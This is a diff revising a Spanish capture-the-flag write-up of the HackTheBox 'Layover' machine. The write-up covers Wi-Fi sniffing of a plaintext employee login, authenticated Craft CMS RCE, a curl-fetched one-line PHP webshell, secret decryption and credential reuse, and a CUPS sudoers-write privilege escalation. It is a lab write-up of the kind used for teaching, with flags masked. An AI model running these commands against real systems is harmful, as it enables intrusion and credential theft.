@@ -9,7 +9,7 @@
 - `user.txt` → `b6930da5****`
 - `root.txt` → `1b5b147e****`
 
-> **Evidencias visuales.** Las capturas citadas en este documento se entregan en la carpeta **`screenshots/`** que acompaña al writeup. Cada paso relevante incluye una imagen en la forma `![descripción](screenshots/NN_nombre.png)` seguida de una **leyenda** que indica **qué evidencia aporta** y **qué pista de la metodología aporta cada captura** (por ejemplo, que el acceso es una sesión RDP real, que la salida de comandos es del objetivo o que la captura de tráfico proviene del segmento Wi-Fi interno). Todas las capturas provienen de la ejecución real (cliente RDP sobre `airside-ws01` y consola de post-explotación); no son reconstrucciones.
+> **Evidencias visuales.** Las capturas citadas en este documento se entregan en `screenshots/`. Proceden de la sesión RDP real sobre `airside-ws01`; algunas muestran pruebas descartadas y se identifican como tales. La ejecución como `www-data` y la escalada por CUPS se acreditan con las salidas de comandos reproducidas en el texto, sin atribuirles una captura que no existe.
 >
 > **Sobre flags y credenciales (versión pública).** HTB genera `user.txt`/`root.txt` **por instancia**: el valor válido es el del despliegue activo en el momento de la explotación. Por política de divulgación responsable, en esta versión pública **las flags y las contraseñas/claves han sido enmascaradas** en el texto (p. ej. `b6930da5****`, `Contractor****`, `Fl1ght****`, `Skyp0rt****`, `CraftDB_pw_****`) y **redactadas en las capturas** donde aparecen. Los enmascaramientos son deliberados y no afectan a la reproducibilidad del procedimiento.
 
@@ -21,7 +21,7 @@ Layover es una máquina Linux (Medium) planteada como **assumed breach**: no se 
 
 1. **Acceso inicial (RDP):** las credenciales `contractor:Contractor****` dan acceso por escritorio remoto (XFCE) al host `airside-ws01`. La cuenta pertenece a los grupos `sudo`, `netdev` y **`wireshark`**.
 2. **Red interna por Wi-Fi:** `airside-ws01` tiene una segunda interfaz `wlan2` en la red interna `10.13.37.0/24`. El portal cautivo `wifi.international.htb` anuncia el portal de empleados `portal.international.htb/miles/`.
-3. **Captura de credenciales en claro:** abusando del grupo `wireshark`, se pone `wlan2` en **modo monitor** y se esnifa con `tcpdump`/`tshark` un `POST` HTTP **en texto plano** a `/miles/login.php` con `username`/`password`.
+3. **Captura de credenciales en claro:** se crea la interfaz monitor `mon0` y se captura con `tcpdump`/`tshark` un `POST` HTTP **en texto plano** a `/miles/login.php` con `username`/`password`. La captura decisiva usa `sudo`.
 4. **RCE autenticada en Craft CMS 5.9.8:** la credencial capturada es válida en el control panel (`/admin`). El endpoint `element-search` instancia objetos desde JSON; inyectando un *behavior* de Yii2 (`AttributeTypecastBehavior`) cuyo callable apunta a `ConsoleProcessus::execute()` se logra **ejecución de comandos ciega** como `www-data` y se despliega un webshell en `/assets/shell.php`.
 5. **Post-explotación y pivote:** `.env` entrega la `CRAFT_SECURITY_KEY` y credenciales de MySQL; el módulo `htbairways` guarda el secreto del relé de correo **cifrado** en la tabla `htbairways_settings` y se descifra reutilizando la clave de seguridad (componente `Security` de Yii2) → `aporter:Skyp0rt****`. La credencial se reutiliza para **SSH** a `10.13.37.10` → `user.txt`.
 6. **Escalada a root (CVE-2026-34990, CUPS ≤ 2.4.16):** se filtra el token de autenticación local de `cupsd` (escucha sólo en `127.0.0.1:631`) mediante un servidor IPP malicioso y se abusa de un `device-uri` `file://` para escribir un fragmento en `/etc/sudoers.d/` → `root.txt`.
@@ -32,7 +32,7 @@ Dos controles mal configurados concentran el riesgo: **credenciales de empleado 
 
 ## 1. Reconocimiento
 
-Comprobación inicial de superficie (sin `-p-` la primera pasada queda "vacía" porque los servicios expuestos son pocos):
+Comprobación inicial de superficie con los 1000 puertos TCP más comunes:
 
 ```bash
 nmap -Pn -sT -sV --top-ports 1000 -T3 -oN nmap-initial.txt 10.129.163.232
@@ -56,7 +56,7 @@ PORT     STATE SERVICE
 3389/tcp open  ms-wbt-server
 ```
 
-La huella RDP (`--script rdp-ntlm-info,rdp-enum-encryption`) confirma RDP estándar (NLA, RC4 128 bits). Un `ms-wbt-server` sobre un host Linux indica **xrdp**, es decir, un escritorio gráfico Linux detrás de RDP. El único vector de entrada con el contexto entregado es **RDP**.
+La huella RDP (`--script rdp-ntlm-info,rdp-enum-encryption`) confirma que el servicio acepta conexiones RDP. `ms-wbt-server` es la etiqueta de servicio de Nmap, no una identificación de Windows. La sesión posterior mostró un escritorio XFCE de Linux. SSH también estaba abierto, pero rechazó la cuenta entregada; RDP fue la vía de entrada que funcionó.
 
 ---
 
@@ -73,7 +73,7 @@ id; hostname
 Dos hechos relevantes para la cadena:
 
 - `27(sudo)` — `contractor` puede escalar a root en **este** host (no en el objetivo final). Se confirma con `sudo -l`/`sudo -v`.
-- `121(wireshark)` — la cuenta puede poner la interfaz inalámbrica en **modo monitor** y capturar tráfico **sin `sudo`** (capacidades `CAP_NET_RAW`/`CAP_NET_ADMIN` concedidas vía grupo).
+- `121(wireshark)` — pista para investigar captura de tráfico. La toma que recuperó el POST se hizo con `sudo` sobre `mon0`; la pertenencia al grupo no demuestra por sí sola capacidad para poner la radio en modo monitor sin privilegios.
 
 ![Escritorio XFCE tras el acceso RDP como contractor](screenshots/01_01_escritorio_rdp.png)
 *Fig. 2.1 — Escritorio XFCE del host `airside-ws01` alcanzado por RDP con la cuenta `contractor`. Prueba de que el acceso es una sesión gráfica real sobre un host Linux (no Windows), punto de partida del pivot.*
@@ -85,7 +85,7 @@ Dos hechos relevantes para la cadena:
 *Fig. 2.3 — Comprobación de `sudo -l`: el usuario `contractor` pertenece a `sudo`. Pista clave: el privilegio es local a `airside-ws01`, no al objetivo final; sirve para reconocer este host como punto de paso y no el objetivo.*
 
 ![Grupo wireshark y capacidades de red](screenshots/01_04_root_y_red.png)
-*Fig. 2.4 — Pertenencia al grupo `wireshark` (captura de tráfico sin privilegios) y reconocimiento de red. Es el habilitador directo de la captura de credenciales en claro.*
+*Fig. 2.4 — `sudo id` devuelve `uid=0(root)` en el host de paso; `ip -brief addr` muestra las interfaces inalámbricas aún desconectadas. La imagen no muestra la pertenencia al grupo `wireshark`, que consta en la salida de `id` del bloque anterior.*
 
 ![Enumeración inicial de la cuenta y del sistema](screenshots/01_05_enumeracion.png)
 *Fig. 2.5 — Enumeración básica del host de paso (versión de SO, interfaces, herramientas disponibles) que orienta el pivot a la red interna.*
@@ -152,8 +152,8 @@ getent hosts portal.international.htb
 ![Acceso HTTP al portal](screenshots/03_01_portal_http.png)
 *Fig. 4.1 — Respuesta HTTP del portal. Evidencia de que el portal se sirve en texto plano (sin TLS), condición necesaria para la captura posterior.*
 
-![Resolución DNS del portal](screenshots/03_02_dns_portal.png)
-*Fig. 4.2 — Confirmación del mapeo `portal.international.htb` → `10.13.37.10` antes de operar contra el portal.*
+![Resolución del portal cautivo y timeout inicial](screenshots/03_02_dns_portal.png)
+*Fig. 4.2 — La pantalla muestra `wifi.international.htb` → `10.13.37.1` y un `curl` que agotó el tiempo de espera. No demuestra el mapeo de `portal.international.htb`; ese dato se verifica con `getent hosts` en el bloque de comandos.*
 
 ![Aplicación de millas (miles)](screenshots/03_03_miles_http.png)
 *Fig. 4.3 — Aplicación de millas accesible por HTTP; la portada enlaza al alta de sesión de empleados.*
@@ -166,14 +166,16 @@ getent hosts portal.international.htb
 
 ---
 
-## 5. Captura de credenciales en claro (sniffing sobre `wlan2`)
+## 5. Captura de credenciales en claro (interfaz monitor `mon0`)
 
-Aprovechando el grupo `wireshark`, se captura el tráfico del segmento Wi-Fi y se aísla el `POST` de login:
+Tras descartar una prueba sobre `wlan3`, se usó `mon0` como interfaz monitor. La captura definitiva se guardó en `/tmp/layover-staff.pcap`; allí se aisló el `POST` de login:
 
 ```bash
-sudo tcpdump -i wlan2 -s0 -U -w /tmp/layover-staff.pcap
+sudo iw phy phy2 interface add mon0 type monitor
+sudo ip link set mon0 up
+sudo tcpdump -i mon0 -s0 -U -w /tmp/layover-staff.pcap
 tshark -r /tmp/layover-staff.pcap -Y "http.request.method == POST" \
-      -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri 2>/dev/null | head
+      -T fields -e frame.number -e ip.src -e ip.dst -e http.host -e http.request.uri 2>/dev/null | head
 # 296   10.13.37.132    10.13.37.10    portal.international.htb    /miles/login.php
 ```
 
@@ -186,7 +188,7 @@ fields [('username', 5), ('password', 15)]
 Se extrae el cuerpo y se reproduce la petición de login contra `/miles/login.php`:
 
 ```bash
-curl -sS -max-time 10 -D /tmp/layover-login-headers -o /tmp/layover-login-response \
+curl -sS --max-time 10 -D /tmp/layover-login-headers -o /tmp/layover-login-response \
      -c /tmp/layover-cookies -b /tmp/layover-cookies \
      --data-binary @/tmp/layover-login-body \
      -H "Content-Type: application/x-www-form-urlencoded" \
@@ -195,25 +197,25 @@ curl -sS -max-time 10 -D /tmp/layover-login-headers -o /tmp/layover-login-respon
 # <title>HTB Airways Miles — Jenny Crawford</title>
 ```
 
-La sesión autenticada corresponde al miembro **Jenny Crawford**; la credencial capturada en claro es **`jenny / Fl1ght****`**.
+El `POST` devolvió una página personalizada para **Jenny Crawford**, lo que valida el par **`jenny / Fl1ght****`** en esa petición. La respuesta no emitió `Set-Cookie`; al consultar después `/miles/` con el cookie jar volvió a aparecer «Member Sign In». Por tanto, el replay **no demostró una sesión persistente en Miles**. La reutilización del par se comprobó por separado en Craft CMS.
 
 ![Capacidad de modo monitor de wlan2](screenshots/04_01_capacidad_monitor.png)
-*Fig. 5.1 — Comprobación de que la interfaz admite modo monitor: `iw list`/`iwconfig` sin `sudo`, gracias al grupo `wireshark`. Habilita la captura en el segmento inalámbrico.*
+*Fig. 5.1 — La radio anuncia soporte de modo monitor. Esto justifica crear una interfaz de captura; todavía no acredita que se hayan obtenido paquetes de otros clientes.*
 
-![Inicio del modo monitor](screenshots/04_02_monitor_inicio.png)
-*Fig. 5.2 — Paso de `wlan2` a modo monitor; la interfaz queda en estado `monitor`, condición necesaria para observar el tráfico de otros clientes de la red.*
+![Prueba inicial sobre wlan3](screenshots/04_02_monitor_inicio.png)
+*Fig. 5.2 — Ensayo sobre `wlan3` con `sudo`. Esta captura muestra el comando antes de completarse; no es el PCAP que entregó la credencial.*
 
-![Monitorización activa](screenshots/04_03_monitor_activo.png)
-*Fig. 5.3 — Interfaz en modo monitor escuchando el canal de la red interna. Sin este modo no se observaría el tráfico de otros clientes Wi-Fi.*
+![Resultado parcial de la prueba sobre wlan3](screenshots/04_03_monitor_activo.png)
+*Fig. 5.3 — `wlan3` llegó a escuchar, pero el ajuste de canal mostró `Device or resource busy`. Se pasó a `mon0` para la captura útil.*
 
 ![Prueba sobre la interfaz mon0](screenshots/04_04_mon0_test.png)
-*Fig. 5.4 — Verificación de que el tráfico del segmento es visible (`mon0`). Control positivo de la captura: confirma alcance antes de esperar el POST.*
+*Fig. 5.4 — `mon0` recibe beacons del punto de acceso. Es un control positivo del modo monitor, no aún del POST de personal.*
 
-![Metadatos del POST capturado](screenshots/04_05_post_metadata.png)
-*Fig. 5.5 — `tshark` filtrando `http.request.method == POST`: aparece el frame 296 origen `10.13.37.132` → destino `10.13.37.10`, URI `/miles/login.php`. Evidencia de la transmisión en claro de la autenticación.*
+![Inicio de la captura definitiva](screenshots/04_05_post_metadata.png)
+*Fig. 5.5 — Inicio de `tcpdump -i mon0` y creación del PCAP definitivo. El filtro de POST aún está escribiéndose; el frame 296 se ve en las figuras siguientes.*
 
 ![Comprobación del POST de personal](screenshots/04_06_staff_post_check.png)
-*Fig. 5.6 — Extracción del cuerpo del POST y del host/URI; el tráfico pertenece al portal interno `portal.international.htb`.*
+*Fig. 5.6 — El filtro de `tshark` muestra el frame 296, origen `10.13.37.132` y destino `10.13.37.10`, URI `/miles/login.php`. Aquí aparece por primera vez el POST en una captura.*
 
 ![Forma del cuerpo del POST](screenshots/04_07_body_shape.png)
 *Fig. 5.7 — Parseo del cuerpo `application/x-www-form-urlencoded`: dos campos (`username`, `password`). La estructura del formulario queda confirmada.*
@@ -221,7 +223,7 @@ La sesión autenticada corresponde al miembro **Jenny Crawford**; la credencial 
 ![Campos del POST (valores redactados)](screenshots/04_08_campos_redactados.png)
 *Fig. 5.8 — Listado de los campos extraídos del POST (longitudes `username` 5 / `password` 15). Los valores van redactados en esta versión pública.*
 
-> **Fallo de seguridad:** transporte de credenciales de empleado por **HTTP sin cifrar** en una red Wi-Fi de acceso compartida, combinado con el grupo `wireshark` asignado a una cuenta de bajo privilegio. Cualquier usuario del mismo segmento con esa capacidad puede leer contraseñas de empleado.
+> **Fallo de seguridad:** transporte de credenciales de empleado por **HTTP sin cifrar** en una red Wi-Fi donde el host de paso pudo observar el POST de otro cliente. La captura efectiva requirió `sudo` en este laboratorio; no se atribuye ese privilegio únicamente al grupo `wireshark`.
 
 ---
 
@@ -235,12 +237,14 @@ curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" \
 # 302 http://portal.international.htb/admin/login
 ```
 
-Login con los tokens CSRF correctos:
+Login con el token CSRF y el nombre de campo `loginName` que usa Craft. El reproducer [`craft_login.py`](craft_login.py) solicita la contraseña por terminal; no se escribe en el comando ni en el repositorio:
 
 ```bash
-python3 craft_login.py jenny 'Fl1ght****' /tmp/cj
+python3 craft_login.py jenny /tmp/cj
 # -> login HTTP 200 / dashboard 200 / "AUTHED"
 ```
+
+El primer intento con el campo `username` devolvió `400` por parámetro requerido ausente. El formulario de Craft usa `loginName`. Una versión temprana del script leía sólo 4000 bytes del dashboard y podía mostrar `NOT_AUTHED` aunque el marcador CSRF estuviera más adelante; el reproducer adjunto lee el cuerpo completo y comprueba que la URL final no sea `/admin/login`.
 
 **Vector de RCE.** Con sesión válida, el endpoint
 
@@ -262,7 +266,9 @@ curl -s http://portal.international.htb/assets/o.txt
 # uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-**Despliegue de webshell.** `escapeshellcmd()` elimina redirecciones `>`, por lo que se usa `curl --output` y un servidor HTTP local como origen del fichero:
+El script [`layover_rce.py`](layover_rce.py) necesita el cookie jar `/tmp/cj` generado por el login anterior. Un `500` en la petición ciega no basta como prueba: la lectura de `o.txt` proporciona el resultado del comando.
+
+**Despliegue de webshell.** Tras un intento de transferencia por redirección que no creó el fichero esperado, se usó `curl --output` y un servidor HTTP local como origen:
 
 ```bash
 python3 layover_rce.py "curl http://10.13.37.182:8080/shell.php --output /var/www/portal/web/assets/shell.php"
@@ -272,23 +278,23 @@ curl -s "http://portal.international.htb/assets/shell.php?cmd=id"
 
 `shell.php` = `<?php system($_GET["cmd"]); ?>`. A partir de aquí se opera como `www-data`.
 
-![Replay del login de empleado](screenshots/05_01_login_replay.png)
-*Fig. 6.1 — Reproducción del `POST` capturado contra `/miles/login.php` con `curl`. Evidencia de que la credencial es reutilizable y de que se obtiene sesión.*
+![Replay del POST de empleado](screenshots/05_01_login_replay.png)
+*Fig. 6.1 — Reproducción del `POST` capturado contra `/miles/login.php` con `curl`. Es una prueba puntual de validez de la credencial, no de sesión persistente.*
 
-![Resultado del login reproduccido](screenshots/05_02_login_resultado.png)
-*Fig. 6.2 — Respuesta `200` con el título de sesión del miembro; el `Set-Cookie` resultante confirma la sesión iniciada.*
+![Resultado del replay del login](screenshots/05_02_login_resultado.png)
+*Fig. 6.2 — Respuesta `200` con título personalizado para Jenny Crawford. No aparece `Set-Cookie`; la captura no acredita continuidad de sesión.*
 
-![Mapa de la página de autenticación](screenshots/05_03_mapa_auth.png)
-*Fig. 6.3 — Reconocimiento del formulario/endpoint de autenticación (tokens CSRF) necesario para el login automatizado.*
+![Inspección de la respuesta de Miles](screenshots/05_03_mapa_auth.png)
+*Fig. 6.3 — Inspección del HTML devuelto por el replay de Miles. La captura muestra contenido del portal de millas; no muestra el token CSRF ni el formulario de Craft.*
 
-![Lectura de la sesión autenticada](screenshots/05_04_sesion_readback.png)
-*Fig. 6.4 — Confirmación de la sesión en el control panel de Craft. Nota: una lectura de sólo 4000 bytes parecía "no autenticado" porque `csrfTokenValue` quedaba fuera de esos bytes; la comprobación fiable usa el cuerpo completo o el redirect final.*
+![Comprobación de la sesión de Miles](screenshots/05_04_sesion_readback.png)
+*Fig. 6.4 — El `GET` posterior a `/miles/` vuelve a «Member Sign In». Es un control negativo: no hubo sesión persistente de Miles. La autenticación de Craft se valida por separado con `craft_login.py` y la operación RCE.*
 
-![Canal de shell inverso durante la explotación](screenshots/06_01_canal_shell.png)
-*Fig. 6.5 — Consola de explotación mostrando el canal usado durante la ejecución de comandos (transferencia por HTTP/`curl` y pruebas de marcador). Evidencia del contexto operativo del RCE.*
+![Ensayo de canal inverso que no prosperó](screenshots/06_01_canal_shell.png)
+*Fig. 6.5 — Pruebas de conectividad y de shell inversa desde el host de paso. Se muestran como intento descartado; no prueban RCE en `portal`.*
 
-![Verificación del canal de shell](screenshots/06_02_canal_shell_2.png)
-*Fig. 6.6 — Segunda vista del canal de shell. Los intentos que no prosperaron (p. ej. redirección con `>`) se detallan en el Anexo A.*
+![Fallo del canal de shell inversa](screenshots/06_02_canal_shell_2.png)
+*Fig. 6.6 — La consola muestra `Connection refused` hacia el listener probado. La RCE positiva se acredita con la lectura de `o.txt` y el `id` como `www-data` del bloque anterior.*
 
 > **Fallo de seguridad:** ejecución remota de código autenticada por instanciación de objetos controlados por el usuario en el endpoint `element-search` del control panel. El privilegio mínimo del portal no debería permitir instanciar clases del framework desde JSON.
 
@@ -328,7 +334,7 @@ PW              Skyp0rt****
 
 Credencial del servicio de correo del portal: **`aporter : Skyp0rt****`**.
 
-> **Fallo de seguridad:** el mismo material de clave que protege las sesiones aplicativas cifra secretos de integración en base de datos, de modo que la lectura del `.env` (o de la clave) permite descifrarlos todos.
+> **Impacto observado:** con la clave de `.env` se descifró el blob del relé de correo identificado en `htbairways_settings`. Este paso depende de la RCE previa y no demuestra acceso a todos los posibles secretos de la aplicación.
 
 ---
 
@@ -337,8 +343,11 @@ Credencial del servicio de correo del portal: **`aporter : Skyp0rt****`**.
 La credencial del relé se reutiliza como contraseña del usuario Linux `aporter` en el propio `portal` (`10.13.37.10`):
 
 ```bash
-sshpass -p 'Skyp0rt****' ssh -o StrictHostKeyChecking=no aporter@10.13.37.10 \
+read -rs SSHPASS  # introducir la contraseña descifrada del relé
+export SSHPASS
+sshpass -e ssh -o StrictHostKeyChecking=no aporter@10.13.37.10 \
     'id; hostname; cat ~/user.txt'
+unset SSHPASS
 # uid=1001(aporter) gid=1001(aporter) groups=1001(aporter)
 # portal
 # b6930da5****
@@ -348,7 +357,7 @@ sshpass -p 'Skyp0rt****' ssh -o StrictHostKeyChecking=no aporter@10.13.37.10 \
 *Fig. 9.1 — Preparación del pivote SSH desde el host de paso hacia `10.13.37.10` (cliente, claves y herramientas presentes).*
 
 ![Verificación de host keys SSH](screenshots/06_04_ssh_hostkeys.png)
-*Fig. 9.2 — Diagnóstico de conexión/`known_hosts` durante el pivote; el destino es el portal interno y la autenticación usa la credencial recuperada.*
+*Fig. 9.2 — Diagnóstico de conexión y `known_hosts` hacia el portal interno. La captura no acredita el login; el resultado de `id`, `hostname` y `user.txt` se muestra en el bloque de salida anterior.*
 
 **`user.txt` = `b6930da5****`**
 
@@ -366,13 +375,19 @@ cups-config --version
 ss -ltnp | grep 631        # cupsd escucha sólo en 127.0.0.1:631
 ```
 
-Se explota la fuga del token de autenticación local (`CVE-2026-34990`) en tres pasos:
+Se explota la fuga del token de autenticación local descrita en el [aviso de OpenPrinting para CVE-2026-34990](https://github.com/OpenPrinting/cups/security/advisories/GHSA-c54j-2vqw-wpwp) en tres pasos:
 
 1. **Fuga del token local de `cupsd`:** un servidor IPP malicioso responde `401` con `WWW-Authenticate: Local trc="y"` para forzar a `cupsd` a reenviar su token de autenticación local; el servidor lo captura.
 2. **Coacción de `cupsd`:** se crea una cola con `device-uri` apuntando al servidor IPP malicioso, provocando la conexión saliente desde `cupsd` (que corre como root).
 3. **Escritura arbitraria vía `file://`:** se registra una impresora permanente cuyo `device-uri` es `file:///etc/sudoers.d/aporter-pwn` y se envía un trabajo con `application/vnd.cups-raw` + `compression=gzip`, escribiendo el contenido en el fichero indicado.
 
-Salida del exploit ejecutado como `aporter`:
+El reproducer local es [`poc_cups_34990.py`](poc_cups_34990.py). Se ejecuta ya como `aporter` en `portal`:
+
+```bash
+python3 poc_cups_34990.py
+```
+
+Salida observada, con el token redactado:
 
 ```
 [*] CVE-2026-34990 | user=aporter | cupsd=127.0.0.1:631
@@ -392,7 +407,7 @@ sudo -n cat /root/root.txt
 
 **`root.txt` = `1b5b147e****`**
 
-> **Fallo de seguridad:** versión de CUPS vulnerable a la fuga del token local y a la escritura arbitraria de ficheros vía `file://` desde `device-uri`, permitiendo a un usuario sin privilegios escribir en `/etc/sudoers.d/`. Remediación: actualizar CUPS a la versión parcheada (> 2.4.16) y restringir la creación de colas/`device-uri` a administradores.
+> **Fallo de seguridad:** la cadena de fuga del token local y cola `file://` permitió escribir en `/etc/sudoers.d/` desde una cuenta sin privilegios. Remediación: instalar CUPS 2.4.17 o el paquete corregido de la distribución, y restringir la creación de colas y los `device-uri` peligrosos. Una versión nominal antigua puede tener un parche retroportado; hay que comprobar el paquete concreto.
 
 ---
 
@@ -410,12 +425,12 @@ sudo -n cat /root/root.txt
 | # | Hallazgo | Impacto | Recomendación |
 |---|----------|---------|---------------|
 | 1 | Portal de empleados servido por **HTTP sin cifrar** en la red Wi-Fi de acceso | Robo de credenciales (captura pasiva) | Servir el portal por **HTTPS** extremo a extremo y redirigir HTTP; HSTS |
-| 2 | Cuenta de bajo privilegio en el grupo **`wireshark`** (CAP_NET_RAW/ADMIN) | Captura de tráfico del segmento | Retirar capacidades de captura a cuentas no administrativas; auditar el grupo `wireshark` |
+| 2 | Cuenta del host de paso con `sudo` completo y acceso a la radio Wi-Fi | Captura del POST de otro cliente con `sudo` | Limitar el acceso administrativo y las capacidades de monitorización inalámbrica |
 | 3 | Host de paso conectado a **dos redes** (gestión + Wi-Fi interna) | Puente entre segmentos | Segmentar y limitar el doble encolado; firewall entre zonas |
 | 4 | **Craft CMS 5.9.8** con `element-search` que instancia objetos desde JSON | RCE autenticada | Actualizar Craft y restringir/validar la instanciación de clases del framework desde entrada del usuario |
-| 5 | **Reutilización de la `CRAFT_SECURITY_KEY`** para cifrar secretos de integración | Descifrado de todos los secretos | Claves separadas por propósito; gestión de secretos fuera de la BD/aplicación |
+| 5 | Secreto de integración cifrado con material accesible tras la RCE | Descifrado del blob del relé de correo observado | Aislar secretos de integración y limitar su acceso desde el proceso web |
 | 6 | **Reutilización de credenciales** correo ↔ cuenta de sistema (`aporter`) | Movimiento lateral | Contraseñas únicas por servicio; rotación y gestor de secretos |
-| 7 | **CUPS 2.4.16** vulnerable (`CVE-2026-34990`) | Escritura arbitraria como root → root | Actualizar CUPS (> 2.4.16); restringir creación de colas/`device-uri` a administradores |
+| 7 | **CUPS 2.4.16** vulnerable (`CVE-2026-34990`) | Escritura arbitraria como root → root | Instalar CUPS 2.4.17 o el parche de la distribución; restringir colas y `device-uri` |
 
 **Cadena de confianza rota:** los puntos 2 y 1 convierten una red Wi-Fi "de acceso" en un punto de escucha con contraseñas en claro; el punto 4 convierte esa credencial en RCE; el punto 7 convierte el acceso como `aporter` en **root**.
 
@@ -427,13 +442,14 @@ Documentar lo que **no** funcionó explica la ruta elegida.
 
 1. **Acceso directo a `10.13.37.10` desde el host atacante** → la ruta por `tun0` no alcanza `10.13.37.0/24` (paquetes bloqueados). Obligó a pivotar desde `airside-ws01`, que sí tiene `wlan2` en esa red.
 2. **Subida del webshell por escritura directa en disco desde el host atacante** → inviable por el aislamiento anterior; se resolvió publicando la carga por HTTP en `10.13.37.182:8080` y descargándola con el propio RCE.
-3. **RCE con redirección `>`** → `escapeshellcmd()` elimina los caracteres de redirección; se cambió a `curl --output <ruta>`.
+3. **Intento de transferencia con `>`** → no dejó el fichero esperado; se cambió a `curl --output <ruta>`. Otra prueba `id > .../o.txt` sí produjo salida, de modo que la evidencia no sostiene un bloqueo general de `>`.
 4. **Primera petición del RCE devolvía `403`** → se ajustó el envío (sesión/CSRF y forma del payload del endpoint) hasta obtener la ejecución ciega (verificación por temporización/fichero).
-5. **Verificación de sesión con lectura parcial del dashboard** → leer sólo los primeros 4000 bytes daba un falso "no autenticado" porque `csrfTokenValue` aparecía más adelante; se pasó a inspeccionar el cuerpo completo o el redirect final.
+5. **Verificación de sesión con lectura parcial del dashboard** → leer sólo los primeros 4000 bytes daba un falso "no autenticado" porque `csrfTokenValue` aparecía más adelante; el reproducer adjunto lee el cuerpo completo y comprueba la URL final.
 6. **Prueba de inyección de comandos por temporización en la app antes del RCE** → un `sleep` en parámetros no produjo retraso (sin efecto); se descartó ese vector y se pivoteó al gadget del control panel.
-7. **Ajuste de modo monitor / canal en `wlan2`** → requirió fijar correctamente el canal para capturar el `POST` del portal; se confirmó por la aparición del frame esperado en el PCAP.
-8. **Race condition al preparar ficheros con base64 entre el editor y la shell del host** → los ficheros no siempre eran visibles en el mismo lote de comandos; se separó la escritura de la ejecución (pausa de 1 s antes del `base64 -d`). No afecta a la validez de los pasos documentados.
-9. **Autenticación SSH por contraseña rechazada en un `sshd` intermedio** (`PasswordAuthentication no`) → se usó la credencial recuperada contra el `sshd` del portal (puerto 22 del objetivo interno), donde sí aplica.
+7. **Prueba sobre `wlan3` y captura inicial en `mon0`** → el ajuste de canal de `wlan3` devolvió `Device or resource busy`; la primera toma en `mon0` mostró tráfico, pero todavía no el POST. La captura final en `mon0` sí mostró el frame 296.
+8. **Replay de Miles sin sesión persistente** → el POST devolvió la página personalizada, pero no `Set-Cookie`; un GET posterior mostró «Member Sign In». La autenticación aprovechable se comprobó después en Craft CMS.
+9. **Race condition al preparar ficheros con base64 entre el editor y la shell del host** → los ficheros no siempre eran visibles en el mismo lote de comandos; se separó la escritura de la ejecución (pausa de 1 s antes del `base64 -d`). No afecta a la validez de los pasos documentados.
+10. **Autenticación SSH por contraseña rechazada en un `sshd` intermedio** (`PasswordAuthentication no`) → se usó la credencial recuperada contra el `sshd` del portal (puerto 22 del objetivo interno), donde sí aplica.
 
 ---
 
@@ -475,9 +491,9 @@ root.txt : 1b5b147e****
 RDP contractor ──▶ airside-ws01 (Linux, grupos sudo/netdev/wireshark)
         │
         ├─ wlan2 → 10.13.37.0/24 (red interna Wi-Fi)
-        ├─ sniff wlan2 (tcpdump/tshark, modo monitor) → POST /miles/login.php en claro
+        ├─ sniff mon0 (tcpdump/tshark, modo monitor) → POST /miles/login.php en claro
         │        └─ credencial: jenny / Fl1ght****
-        ├─ login portal.international.htb/miles → "Jenny Crawford"
+        ├─ replay POST /miles/login.php → página puntual "Jenny Crawford"
         ├─ Craft CMS 5.9.8 /admin → RCE autenticada (element-search, Yii2 behavior)
         │        └─ webshell /assets/shell.php → www-data
         ├─ .env → CRAFT_SECURITY_KEY, craftuser/CraftDB_pw_****
